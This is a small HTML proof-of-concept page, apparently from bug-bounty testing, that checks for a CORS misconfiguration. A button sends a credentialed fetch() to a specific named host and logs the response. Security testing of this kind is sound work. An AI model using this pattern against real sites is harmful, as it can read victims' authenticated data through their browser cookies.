<!DOCTYPE html>
<html>
<head>
  <title>CORS Exploit Test</title>
</head>
<body>
  <h1>CORS Exploit Test</h1>
  <button onclick="sendCorsRequest()">Test CORS</button>

  <script>
    function sendCorsRequest() {
      fetch("https://intigriti.ilias-solutions.com/intigriti/assmgmt/", {
        method: "GET",
        credentials: "include"  // Include cookies
      })
      .then(response => response.text())
      .then(text => {
        console.log("CORS Response:", text);
        alert("Response received. Check devtools.");
      })
      .catch(err => {
        console.error("CORS Error:", err);
        alert("CORS request failed. Maybe patched?");
      });
    }
  </script>
</body>
</html>
